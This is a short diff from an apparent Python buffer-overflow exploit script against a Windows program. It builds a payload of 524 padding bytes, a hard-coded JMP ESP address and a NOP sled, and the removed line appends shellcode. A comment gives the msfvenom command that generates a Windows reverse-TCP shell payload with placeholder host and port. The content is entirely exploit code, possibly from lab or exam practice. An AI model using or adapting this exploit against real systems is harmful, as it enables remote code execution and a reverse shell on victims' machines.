@@ -8,7 +8,7 @@ import sys
 
 //JMP ESP = 311712F3
 
-buff = "A" * 524 + "\xf3\x12\x17\x31" + "\x90" * 20 + shell
+buff = "A" * 524 + "\xf3\x12\x17\x31" + "\x90" * 20 
 
 //msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=port -f python -a x86 --platform windows -b "\x00"
 
